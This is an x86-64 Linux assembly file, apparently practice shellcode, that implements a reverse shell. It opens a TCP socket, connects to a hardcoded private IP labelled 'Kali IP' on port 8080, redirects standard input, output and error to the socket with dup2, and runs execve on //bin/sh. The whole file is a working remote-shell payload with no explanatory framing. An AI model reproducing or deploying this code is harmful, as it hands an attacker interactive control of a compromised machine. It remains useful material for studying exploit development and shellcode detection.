global _start

section .text

_start:
	; Creating socket socket(AF_INET, SOCK_STREAM, 0)
	xor rax, rax
	add rax, 41			; call socket function
	xor rdi, rdi
	add rdi, 2			; AF_INET = 2
	xor rsi, rsi
	inc rsi				; SOCK_STREAM = 1
	xor rdx, rdx
	syscall

	mov rdi, rax

	xor rax, rax
	push dword 0x3701a8c0		; Kali IP
;	push dword 0x0100007f	; 127.0.0.1
	push word 0x901f		; Port 8080
	push word 0x02

	mov rsi, rsp
; Call connect function
	xor rdx, rdx
	add rdx, 16
	xor rax, rax
	add rax, 42			; connect
	syscall
; Duplicate sockets
	; dup2 function 
	xor rax,rax
	add rax, 33
	xor rsi, rsi
	syscall

	xor rax,rax
	add rax, 33
	inc rsi
	syscall

	xor rax,rax
	add rax, 33
	inc rsi
	syscall

; execve function
	xor rax, rax
	push rax
	mov rdx, rsp
	mov rbx, 0x68732f6e69622f2f		; //bin/sh
	push rbx
	mov rdi, rsp					; store //bin/sh in RDI
	push rax
	push rdi
	mov rsi,rsp
	add rax, 59						; execve function
	syscall
; call exit
	mov rax, 60
	mov rdi, 0
	syscall
